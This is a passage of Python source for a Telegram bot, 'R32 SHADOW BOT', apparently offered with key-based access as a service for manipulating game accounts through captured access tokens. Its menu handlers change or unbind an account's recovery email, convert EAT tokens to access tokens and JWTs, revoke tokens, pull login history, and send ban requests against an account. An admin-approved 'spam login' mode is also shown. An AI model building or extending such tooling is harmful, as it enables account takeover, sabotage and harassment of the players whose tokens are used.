        msg = f"Step 3/5: OTP sent to {email}\n\n{result}\n\nEnter the OTP received:" if lang == LANG_EN else f"الخطوة 3/5: تم إرسال كود التحقق إلى {email}\n\n{result}\n\nأدخل كود التحقق المستلم:"
        await safe_reply_text(update, msg)
        return
    
    if state == "add_recovery_otp" and context.user_data.get("action") == "add_recovery":
        otp = text
        email = context.user_data.get("add_email")
        token = context.user_data.get("add_token")
        success, result, verifier = verify_otp(email, token, otp)
        if not success or not verifier:
            msg = f"❌ OTP Verification Failed!\n\n{result}" if lang == LANG_EN else f"❌ فشل التحقق من كود OTP!\n\n{result}"
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        
        context.user_data["add_verifier"] = verifier
        context.user_data["state"] = "add_recovery_code"
        msg = f"✅ OTP Verified!\n\n{result}\n\nStep 4/5: Set a 6-digit security code:" if lang == LANG_EN else f"✅ تم التحقق من كود OTP!\n\n{result}\n\nالخطوة 4/5: أدخل كود أمان مكون من 6 أرقام:"
        await safe_reply_text(update, msg)
        return
    
    if state == "add_recovery_code" and context.user_data.get("action") == "add_recovery":
        sec_code = text
        if len(sec_code) != 6 or not sec_code.isdigit():
            msg = "❌ Security code must be exactly 6 digits." if lang == LANG_EN else "❌ يجب أن يكون كود الأمان 6 أرقام بالضبط."
            await safe_reply_text(update, msg)
            return
        
        email = context.user_data.get("add_email")
        token = context.user_data.get("add_token")
        verifier = context.user_data.get("add_verifier")
        success, result = create_bind_request(email, token, verifier, sec_code)
        context.user_data["state"] = None
        msg = f"Step 5/5: Binding Email\n\n{result}" if lang == LANG_EN else f"الخطوة 5/5: ربط الإيميل\n\n{result}"
        await safe_reply_text(update, msg, reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Check Recovery Email -----
    if text == "🔍 Check Recovery Email" or text == "🔍 التحقق من الإيميل":
        context.user_data["action"] = "check_recovery"
        context.user_data["state"] = "check_recovery_token"
        msg = "🔍 Check Recovery Email\n\nEnter Access Token:" if lang == LANG_EN else "🔍 التحقق من إيميل الاسترداد\n\nأدخل توكن الوصول:"
        await safe_reply_text(update, msg)
        return
    
    if state == "check_recovery_token" and context.user_data.get("action") == "check_recovery":
        token = text
        bind_data, bind_success = get_bind_info_raw(token)
        if not bind_success:
            await safe_reply_text(update, "❌ Failed to fetch account bind info. Token may be invalid.")
            context.user_data["state"] = None
            return
        
        email = bind_data.get("email", "")
        pending = bind_data.get("email_to_be", "")
        countdown = bind_data.get("request_exec_countdown", 0)
        rc = bind_data.get("result", -1)
        email_verified = bind_data.get("email_verified", 0)
        
        account_id, nickname, region, valid = get_player_info(token)
        
        verif_status = "✅ Verified" if email_verified == 1 else "❌ Not Verified" if email else "N/A"
        
        msg = f"""📋 **Account Information**

👤 **Nickname:** {nickname}
🆔 **Account ID:** {account_id}
🌍 **Region:** {region}

🔐 **Recovery Email Status:**
• **Current Email:** {mask_email(email) if email else 'None'}
• **Email Verified:** {verif_status}
• **Pending Email:** {pending if pending else 'None'}
• **Countdown:** {countdown if pending else 'N/A'}
• **Result Code:** {rc}

📌 **Summary:** {'✅ Email is verified and bound' if email and email_verified == 1 else '⚠️ Email is bound but not verified' if email else '📭 No recovery email set'}
"""
        await safe_reply_text(update, msg)
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Check Platform -----
    if text == "🌐 Check Platform" or text == "🌐 المنصات المرتبطة":
        context.user_data["action"] = "check_platform"
        context.user_data["state"] = "check_platform_token"
        msg = "🌐 Check Platform\n\nEnter Access Token:" if lang == LANG_EN else "🌐 المنصات المرتبطة\n\nأدخل توكن الوصول:"
        await safe_reply_text(update, msg)
        return
    
    if state == "check_platform_token" and context.user_data.get("action") == "check_platform":
        token = text
        success, error, bounded, available = check_bound(token)
        if not success:
            await safe_reply_text(update, f"❌ Failed to fetch platform info: {error}")
            context.user_data["state"] = None
            return
        
        bounded_names = [PLATFORM_MAP.get(p, f"Unknown ({p})") for p in bounded]
        available_names = [PLATFORM_MAP.get(p, f"Unknown ({p})") for p in available]
        
        msg = f"""🌐 **Platform Bind Information**

🔗 **Bound Accounts:**
{chr(10).join(['• ' + p for p in bounded_names]) if bounded_names else '• None'}

📋 **Available Platforms:**
{chr(10).join(['• ' + p for p in available_names]) if available_names else '• None'}
"""
        await safe_reply_text(update, msg)
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Cancel Recovery Email -----
    if text == "❌ Cancel Recovery Email" or text == "❌ إلغاء ربط الإيميل":
        context.user_data["action"] = "cancel_recovery"
        context.user_data["state"] = "cancel_recovery_token"
        msg = "❌ Cancel Recovery Email\n\nEnter Access Token:" if lang == LANG_EN else "❌ إلغاء ربط الإيميل\n\nأدخل توكن الوصول:"
        await safe_reply_text(update, msg)
        return
    
    if state == "cancel_recovery_token" and context.user_data.get("action") == "cancel_recovery":
        token = text
        email, pending, countdown, rc, success = get_bind_info(token)
        if not success:
            await safe_reply_text(update, "❌ Failed to fetch account bind info. Token may be invalid.")
            context.user_data["state"] = None
            return
        
        if not pending:
            msg = "ℹ️ No pending email change request found to cancel." if lang == LANG_EN else "ℹ️ لا يوجد طلب تغيير إيميل معلق للإلغاء."
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        
        success, result = cancel_bind_request(token)
        await safe_reply_text(update, f"❌ Cancel Recovery Email\n\n{result}")
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Unbind Email -----
    if text == "🔓 Unbind Email" or text == "🔓 فك الربط":
        context.user_data["action"] = "unbind"
        context.user_data["state"] = "unbind_token"
        msg = "🔓 Unbind Email\n\nStep 1/3: Enter Access Token:" if lang == LANG_EN else "🔓 فك ربط الإيميل\n\nالخطوة 1/3: أدخل توكن الوصول:"
        await safe_reply_text(update, msg)
        return
    
    if state == "unbind_token" and context.user_data.get("action") == "unbind":
        token = text
        email, pending, countdown, rc, success = get_bind_info(token)
        if not success:
            await safe_reply_text(update, "❌ Failed to fetch account bind info. Token may be invalid.")
            context.user_data["state"] = None
            return
        
        if not email:
            msg = "❌ No email is currently bound to this account. Nothing to unbind." if lang == LANG_EN else "❌ لا يوجد إيميل مرتبط بهذا الحساب. لا يوجد شيء لفك الربط."
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        
        context.user_data["unbind_token"] = token
        context.user_data["unbind_email"] = email
        context.user_data["state"] = "unbind_method"
        msg = f"🔓 Unbind Email\n\nCurrent email: **{mask_email(email)}**\n\nSelect verification method:" if lang == LANG_EN else f"🔓 فك ربط الإيميل\n\nالإيميل الحالي: **{mask_email(email)}**\n\nاختر طريقة التحقق:"
        await safe_reply_text(update, msg, reply_markup=get_method_keyboard(lang))
        return
    
    if state == "unbind_method" and context.user_data.get("action") == "unbind":
        if text == "📩 OTP" or text == "📩 كود التحقق":
            context.user_data["unbind_method"] = "otp"
            context.user_data["state"] = "unbind_otp"
            email = context.user_data.get("unbind_email")
            token = context.user_data.get("unbind_token")
            success, result = send_otp(email, token)
            msg = f"Step 2/3: OTP sent to {email}\n\n{result}\n\nEnter the OTP received:" if lang == LANG_EN else f"الخطوة 2/3: تم إرسال كود التحقق إلى {email}\n\n{result}\n\nأدخل كود التحقق المستلم:"
            await safe_reply_text(update, msg)
        elif text == "🔐 Security Code" or text == "🔐 كود الأمان":
            context.user_data["unbind_method"] = "sec"
            context.user_data["state"] = "unbind_sec"
            msg = "Step 2/3: Enter your 6-digit security code:" if lang == LANG_EN else "الخطوة 2/3: أدخل كود الأمان المكون من 6 أرقام:"
            await safe_reply_text(update, msg)
        elif text == "↩️ Back to Menu" or text == "↩️ العودة للقائمة":
            context.user_data["state"] = None
            await show_menu(update, user_id, context)
        else:
            await safe_reply_text(update, "Please select a valid option.", reply_markup=get_method_keyboard(lang))
        return
    
    if state == "unbind_otp" and context.user_data.get("action") == "unbind":
        otp = text
        email = context.user_data.get("unbind_email")
        token = context.user_data.get("unbind_token")
        success, result, identity = verify_identity_otp(email, token, otp)
        if not success or not identity:
            msg = f"❌ Identity Verification Failed!\n\n{result}" if lang == LANG_EN else f"❌ فشل التحقق من الهوية!\n\n{result}"
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        context.user_data["unbind_identity"] = identity
        context.user_data["state"] = "unbind_final"
        success, result = create_unbind_request(token, identity)
        msg = f"Step 3/3: Unbinding Email\n\n{result}" if lang == LANG_EN else f"الخطوة 3/3: فك ربط الإيميل\n\n{result}"
        await safe_reply_text(update, msg)
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    if state == "unbind_sec" and context.user_data.get("action") == "unbind":
        sec_code = text
        if len(sec_code) != 6 or not sec_code.isdigit():
            msg = "❌ Security code must be exactly 6 digits." if lang == LANG_EN else "❌ يجب أن يكون كود الأمان 6 أرقام بالضبط."
            await safe_reply_text(update, msg)
            return
        email = context.user_data.get("unbind_email")
        token = context.user_data.get("unbind_token")
        success, result, identity = verify_identity_sec(email, token, sec_code)
        if not success or not identity:
            msg = f"❌ Identity Verification Failed!\n\n{result}" if lang == LANG_EN else f"❌ فشل التحقق من الهوية!\n\n{result}"
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        context.user_data["unbind_identity"] = identity
        context.user_data["state"] = "unbind_final"
        success, result = create_unbind_request(token, identity)
        msg = f"Step 3/3: Unbinding Email\n\n{result}" if lang == LANG_EN else f"الخطوة 3/3: فك ربط الإيميل\n\n{result}"
        await safe_reply_text(update, msg)
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Change Bind Email -----
    if text == "🔄 Change Bind Email" or text == "🔄 تغيير الإيميل":
        context.user_data["action"] = "change"
        context.user_data["state"] = "change_token"
        msg = "🔄 Change Bind Email\n\nStep 1/5: Enter Access Token:" if lang == LANG_EN else "🔄 تغيير الإيميل المرتبط\n\nالخطوة 1/5: أدخل توكن الوصول:"
        await safe_reply_text(update, msg)
        return
    
    if state == "change_token" and context.user_data.get("action") == "change":
        token = text
        email, pending, countdown, rc, success = get_bind_info(token)
        if not success:
            await safe_reply_text(update, "❌ Failed to fetch account bind info. Token may be invalid.")
            context.user_data["state"] = None
            return
        
        if not email:
            msg = "❌ No email is currently bound. Please use 'Add Recovery Email' instead." if lang == LANG_EN else "❌ لا يوجد إيميل مرتبط حالياً. استخدم 'إضافة إيميل' بدلاً من ذلك."
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        
        context.user_data["change_token"] = token
        context.user_data["change_old_email"] = email
        context.user_data["state"] = "change_method"
        msg = f"🔄 Change Bind Email\n\nCurrent email: **{mask_email(email)}**\n\nSelect verification method:" if lang == LANG_EN else f"🔄 تغيير الإيميل المرتبط\n\nالإيميل الحالي: **{mask_email(email)}**\n\nاختر طريقة التحقق:"
        await safe_reply_text(update, msg, reply_markup=get_method_keyboard(lang))
        return
    
    if state == "change_method" and context.user_data.get("action") == "change":
        if text == "📩 OTP" or text == "📩 كود التحقق":
            context.user_data["change_method"] = "otp"
            context.user_data["state"] = "change_old_otp"
            email = context.user_data.get("change_old_email")
            token = context.user_data.get("change_token")
            success, result = send_otp(email, token)
            msg = f"Step 2/5: OTP sent to {email}\n\n{result}\n\nEnter the OTP received:" if lang == LANG_EN else f"الخطوة 2/5: تم إرسال كود التحقق إلى {email}\n\n{result}\n\nأدخل كود التحقق المستلم:"
            await safe_reply_text(update, msg)
        elif text == "🔐 Security Code" or text == "🔐 كود الأمان":
            context.user_data["change_method"] = "sec"
            context.user_data["state"] = "change_old_sec"
            msg = "Step 2/5: Enter your 6-digit security code:" if lang == LANG_EN else "الخطوة 2/5: أدخل كود الأمان المكون من 6 أرقام:"
            await safe_reply_text(update, msg)
        elif text == "↩️ Back to Menu" or text == "↩️ العودة للقائمة":
            context.user_data["state"] = None
            await show_menu(update, user_id, context)
        else:
            await safe_reply_text(update, "Please select a valid option.", reply_markup=get_method_keyboard(lang))
        return
    
    if state == "change_old_otp" and context.user_data.get("action") == "change":
        otp = text
        email = context.user_data.get("change_old_email")
        token = context.user_data.get("change_token")
        success, result, identity = verify_identity_otp(email, token, otp)
        if not success or not identity:
            msg = f"❌ Identity Verification Failed!\n\n{result}" if lang == LANG_EN else f"❌ فشل التحقق من الهوية!\n\n{result}"
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        context.user_data["change_identity"] = identity
        context.user_data["state"] = "change_new_email"
        msg = "Step 3/5: Enter the new email address:" if lang == LANG_EN else "الخطوة 3/5: أدخل عنوان الإيميل الجديد:"
        await safe_reply_text(update, msg)
        return
    
    if state == "change_old_sec" and context.user_data.get("action") == "change":
        sec_code = text
        if len(sec_code) != 6 or not sec_code.isdigit():
            msg = "❌ Security code must be exactly 6 digits." if lang == LANG_EN else "❌ يجب أن يكون كود الأمان 6 أرقام بالضبط."
            await safe_reply_text(update, msg)
            return
        email = context.user_data.get("change_old_email")
        token = context.user_data.get("change_token")
        success, result, identity = verify_identity_sec(email, token, sec_code)
        if not success or not identity:
            msg = f"❌ Identity Verification Failed!\n\n{result}" if lang == LANG_EN else f"❌ فشل التحقق من الهوية!\n\n{result}"
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        context.user_data["change_identity"] = identity
        context.user_data["state"] = "change_new_email"
        msg = "Step 3/5: Enter the new email address:" if lang == LANG_EN else "الخطوة 3/5: أدخل عنوان الإيميل الجديد:"
        await safe_reply_text(update, msg)
        return
    
    if state == "change_new_email" and context.user_data.get("action") == "change":
        new_email = text
        if not new_email or '@' not in new_email:
            msg = "❌ Invalid email format. Please enter a valid email address." if lang == LANG_EN else "❌ صيغة إيميل غير صالحة. يرجى إدخال عنوان إيميل صحيح."
            await safe_reply_text(update, msg)
            return
        context.user_data["change_new_email"] = new_email
        context.user_data["state"] = "change_new_otp"
        token = context.user_data.get("change_token")
        success, result = send_otp(new_email, token)
        msg = f"Step 4/5: OTP sent to {new_email}\n\n{result}\n\nEnter the OTP received:" if lang == LANG_EN else f"الخطوة 4/5: تم إرسال كود التحقق إلى {new_email}\n\n{result}\n\nأدخل كود التحقق المستلم:"
        await safe_reply_text(update, msg)
        return
    
    if state == "change_new_otp" and context.user_data.get("action") == "change":
        otp = text
        new_email = context.user_data.get("change_new_email")
        token = context.user_data.get("change_token")
        success, result, verifier = verify_otp(new_email, token, otp)
        if not success or not verifier:
            msg = f"❌ OTP Verification Failed!\n\n{result}" if lang == LANG_EN else f"❌ فشل التحقق من كود OTP!\n\n{result}"
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        context.user_data["change_verifier"] = verifier
        context.user_data["state"] = "change_final"
        identity = context.user_data.get("change_identity")
        success, result = create_rebind_request(token, identity, new_email, verifier)
        msg = f"Step 5/5: Changing Bind Email\n\n{result}" if lang == LANG_EN else f"الخطوة 5/5: تغيير الإيميل المرتبط\n\n{result}"
        await safe_reply_text(update, msg)
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Get Token Details -----
    if text == "📋 Get Token Details" or text == "📋 تفاصيل التوكن":
        context.user_data["action"] = "token_details"
        context.user_data["state"] = "token_details_input"
        msg = "📋 Get Token Details\n\nEnter Access Token:" if lang == LANG_EN else "📋 تفاصيل التوكن\n\nأدخل توكن الوصول:"
        await safe_reply_text(update, msg)
        return
    
    if state == "token_details_input" and context.user_data.get("action") == "token_details":
        token = text
        account_id, nickname, region, valid = get_player_info(token)
        email, pending, countdown, rc, success = get_bind_info(token)
        bind_data, bind_success = get_bind_info_raw(token)
        email_verified = bind_data.get("email_verified", 0) if bind_success else 0
        
        verif_status = "✅ Verified" if email_verified == 1 else "❌ Not Verified" if email else "N/A"
        
        msg = f"""📋 **Token Details**

🔐 **Token Status:** {'✅ Valid' if valid else '❌ Invalid'}

👤 **Account Information:**
• **Nickname:** {nickname}
• **Account ID:** {account_id}
• **Region:** {region}

🔐 **Recovery Email Status:**
• **Current Email:** {mask_email(email) if email else 'None'}
• **Email Verified:** {verif_status}
• **Pending Email:** {pending if pending else 'None'}
• **Countdown:** {countdown if pending else 'N/A'}
• **Result Code:** {rc}

📌 **Summary:** {'✅ Email is verified and bound' if email and email_verified == 1 else '⚠️ Email is bound but not verified' if email else '📭 No recovery email set'}

🔑 **Access Token:**
`{token}`
"""
        await safe_reply_text(update, msg)
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Eat Token Website -----
    if text == "🔗 Eat Token Website" or text == "🔗 تحويل EAT":
        context.user_data["action"] = "eat_token"
        context.user_data["state"] = "eat_token_input"
        msg = "🔗 Eat Token to Access Token\n\nEnter EAT Token or full URL:" if lang == LANG_EN else "🔗 تحويل EAT إلى توكن وصول\n\nأدخل توكن EAT أو الرابط الكامل:"
        await safe_reply_text(update, msg)
        return
    
    if state == "eat_token_input" and context.user_data.get("action") == "eat_token":
        eat_input = text
        error, result = eat_to_token(eat_input)
        if error:
            await safe_reply_text(update, f"❌ {error}")
            context.user_data["state"] = None
            return
        
        msg = f"""🔗 **EAT to Access Token Conversion**

✅ **Successfully converted!**

👤 **Nickname:** {result.get('nickname', 'Unknown')}
🆔 **Account ID:** {result.get('account_id', 'Unknown')}
🌍 **Region:** {result.get('region', 'Unknown')}

🔑 **Access Token:**
`{result.get('access_token', 'Unknown')}`
"""
        await safe_reply_text(update, msg)
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Revoke Access Token -----
    if text == "🔴 Revoke Access Token" or text == "🔴 إلغاء التوكن":
        context.user_data["action"] = "revoke_token"
        context.user_data["state"] = "revoke_token_input"
        msg = "🔴 Revoke Access Token\n\nEnter Access Token to revoke:" if lang == LANG_EN else "🔴 إلغاء توكن الوصول\n\nأدخل توكن الوصول للإلغاء:"
        await safe_reply_text(update, msg)
        return
    
    if state == "revoke_token_input" and context.user_data.get("action") == "revoke_token":
        token = text
        error, result = do_revoke(token)
        if error:
            await safe_reply_text(update, f"❌ {error}")
            context.user_data["state"] = None
            return
        
        msg = f"""🔴 **Token Revoked Successfully!**

👤 **Nickname:** {result.get('nickname', 'Unknown')}
🆔 **Account ID:** {result.get('account_id', 'Unknown')}
🌍 **Region:** {result.get('region', 'Unknown')}
📌 **Status:** {result.get('status', 'Unknown')}
"""
        await safe_reply_text(update, msg)
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Login History -----
    if text == "📝 Login History" or text == "📝 سجل الدخول":
        context.user_data["action"] = "login_history"
        context.user_data["state"] = "login_history_token"
        msg = "📝 Login History\n\nEnter Access Token or Game JWT Token:" if lang == LANG_EN else "📝 سجل الدخول\n\nأدخل توكن الوصول أو توكن JWT الخاص باللعبة:"
        await safe_reply_text(update, msg)
        return
    
    if state == "login_history_token" and context.user_data.get("action") == "login_history":
        token = text
        await update.message.reply_text("🔄 Fetching login history... This may take a moment.", parse_mode=None)
        
        error, records = get_login_history(token)
        if error:
            await safe_reply_text(update, f"❌ Failed to fetch login history: {error}")
            context.user_data["state"] = None
            return
        
        if not records:
            msg = "📭 No login history records found for this account." if lang == LANG_EN else "📭 لا توجد سجلات دخول لهذا الحساب."
            await safe_reply_text(update, msg)
            context.user_data["state"] = None
            return
        
        account_id, nickname, region, valid = get_player_info(token)
        
        header = f"""📝 **Login History**

👤 **Nickname:** {nickname}
🆔 **Account ID:** {account_id}
🌍 **Region:** {region}
📊 **Total Records:** {len(records)}

"""
        history_lines = []
        for i, rec in enumerate(records[:10], 1):
            ts_raw = rec.get('ts', 0)
            try:
                date_str = datetime.fromtimestamp(ts_raw).strftime('%Y-%m-%d %H:%M:%S')
            except:
                date_str = "Invalid Format"
            dev = rec.get('dev', 'Unknown Device')
            arch = rec.get('arch', 'Unknown Architecture')
            ram = rec.get('ram', 0)
            
            history_lines.append(f"**#{i}** • {date_str}")
            history_lines.append(f"📱 Device: {dev}")
            history_lines.append(f"🏗️ Arch: {arch}")
            history_lines.append(f"💾 RAM: {ram} MB")
            history_lines.append("")
        
        if len(records) > 10:
            history_lines.append(f"... +{len(records) - 10} more records")
        
        msg = header + "\n".join(history_lines)
        await safe_reply_text(update, msg)
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Access Token to JWT -----
    if text == "🔑 Access Token to JWT" or text == "🔑 تحويل إلى JWT":
        context.user_data["action"] = "access_to_jwt"
        context.user_data["state"] = "access_to_jwt_input"
        msg = "🔑 Access Token to JWT\n\nEnter Access Token:" if lang == LANG_EN else "🔑 تحويل توكن الوصول إلى JWT\n\nأدخل توكن الوصول:"
        await safe_reply_text(update, msg)
        return
    
    if state == "access_to_jwt_input" and context.user_data.get("action") == "access_to_jwt":
        token = text
        await update.message.reply_text("🔄 Converting Access Token to JWT...", parse_mode=None)
        success, result = access_to_jwt_api(token)
        if not success:
            await safe_reply_text(update, f"❌ Failed to convert: {result}")
            context.user_data["state"] = None
            return
        
        account_id, nickname, region, valid = get_player_info(token)
        
        msg = f"""🔑 **Access Token to JWT Conversion**

✅ **Successfully converted!**

👤 **Nickname:** {nickname}
🆔 **Account ID:** {account_id}
🌍 **Region:** {region}

🔑 **JWT Token:**
`{result}`
"""
        await safe_reply_text(update, msg)
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Ban Account -----
    if text == "🚫 Ban Account" or text == "🚫 حظر الحساب":
        context.user_data["action"] = "ban_account"
        context.user_data["state"] = "ban_account_input"
        msg = "🚫 Ban Account\n\n⚠️ WARNING: This will attempt to ban the account!\n\nEnter Access Token to ban:" if lang == LANG_EN else "🚫 حظر الحساب\n\n⚠️ تحذير: سيتم محاولة حظر الحساب!\n\nأدخل توكن الوصول للحظر:"
        await safe_reply_text(update, msg)
        return
    
    if state == "ban_account_input" and context.user_data.get("action") == "ban_account":
        token = text
        await update.message.reply_text("🔄 Sending ban request...", parse_mode=None)
        success, result = ban_account_api(token)
        
        if success:
            try:
                parsed = json.loads(result)
                msg = f"""🚫 **Ban Account Response**

✅ **Request Sent Successfully!**

📋 **Response:**
```json
{json.dumps(parsed, indent=4)}"""
            except:
                msg = f"""🚫 **Ban Account Response**

✅ **Request Sent Successfully!**

📋 **Response:**
{result}
"""
        else:
            msg = f"""🚫 **Ban Account Response**

❌ **Failed to send ban request!**

📋 **Error:**
{result}
"""
        await safe_reply_text(update, msg)
        context.user_data["state"] = None
        await safe_reply_text(update, "Press any menu button to continue.", reply_markup=get_user_keyboard(lang))
        return
    
    # ----- Back to Menu -----
    if text == "↩️ Back to Menu" or text == "↩️ العودة للقائمة":
        context.user_data.clear()
        await show_menu(update, user_id, context)
        return
    
    # ----- Fallback -----
    await safe_reply_text(
        update,
        "Please use the menu buttons or contact @r32pro for assistance." if lang == LANG_EN else "يرجى استخدام أزرار القائمة أو الاتصال بـ @r32pro للمساعدة.",
        reply_markup=get_user_keyboard(lang)
    )

# ============================================================
# CALLBACK HANDLER
# ============================================================

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    data = query.data
    lang = DataManager.get_user_lang(user_id)
    is_admin = DataManager.is_admin(user_id)

    if data == "lang_en":
        DataManager.set_user_lang(user_id, LANG_EN)
        await query.edit_message_text("🌍 Language set to English ✅", parse_mode=None)
        await show_menu(update, user_id, context)
        return

    if data == "lang_ar":
        DataManager.set_user_lang(user_id, LANG_AR)
        await query.edit_message_text("🌍 تم ضبط اللغة إلى العربية ✅", parse_mode=None)
        await show_menu(update, user_id, context)
        return

    if data == "spam_warning_yes":
        context.user_data["state"] = "spam_eat_input"
        context.user_data["action"] = "spam_request"
        msg = "🔄 Spam Login Request\n\nPlease send your EAT Token or full URL:" if lang == LANG_EN else "🔄 طلب سبام لوجين\n\nيرجى إرسال توكن EAT أو الرابط الكامل:"
        await query.edit_message_text(msg, parse_mode=None)
        return

    if data == "spam_warning_no":
        msg = "❌ Spam request cancelled." if lang == LANG_EN else "❌ تم إلغاء طلب السبام."
        await query.edit_message_text(msg, parse_mode=None)
        return

    if data == "spam_status":
        return

    if data == "spam_cancel":
        SpamManager.deactivate_spam(user_id)
        msg = "❌ Spam mode has been deactivated." if lang == LANG_EN else "❌ تم إلغاء وضع السبام."
        await query.edit_message_text(msg, parse_mode=None)
        return

    # Admin spam approval/rejection
    if is_admin:
        if data.startswith("spam_approve_"):
            request_id = data.replace("spam_approve_", "")
            if SpamManager.approve_request(request_id):
                req = SpamManager.get_request(request_id)
                if req:
                    user_id_req = req["user_id"]
                    try:
                        await context.bot.send_message(
                            chat_id=user_id_req,
                            text="🔄 Spam Login Request Approved!\n\n✅ Spam Beta Mode has been activated for your account.\n\n🔴 To disable spam, use the 'Cancel Spam' button in the menu.",
                            parse_mode=None
                        )
                    except:
                        pass
                await query.edit_message_text(f"✅ Spam request {request_id} approved.", parse_mode=None)
            else:
                await query.edit_message_text(f"❌ Failed to approve {request_id}.", parse_mode=None)
            return

        if data.startswith("spam_reject_"):
            request_id = data.replace("spam_reject_", "")
            if SpamManager.reject_request(request_id):
                req = SpamManager.get_request(request_id)
                if req:
                    user_id_req = req["user_id"]
                    try:
                        await context.bot.send_message(
                            chat_id=user_id_req,
                            text="❌ Spam Login Request Rejected\n\nYour spam request has been rejected by the admin.\n\nPlease contact @r32pro or @XHR_M for more information.",
                            parse_mode=None
                        )
                    except:
                        pass
                await query.edit_message_text(f"✅ Spam request {request_id} rejected.", parse_mode=None)
            else:
                await query.edit_message_text(f"❌ Failed to reject {request_id}.", parse_mode=None)
            return

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    print("""
🚀 R32 SHADOW BOT v5.2 (ALL-IN-ONE)
👨‍💻 Developer: @r32pro
👨‍💻 Co-Developer: @XHR_M
📢 https://t.me/ShadowCodee
🔑 Key-based Access
👑 Admin: Owner Only
📌 Bot Status: 🟢 Running
    """)
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_callback))
    
    print("🟢 Bot is running...")
    print("🛑 To stop the bot, use the 'Stop Bot' button in the admin panel.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)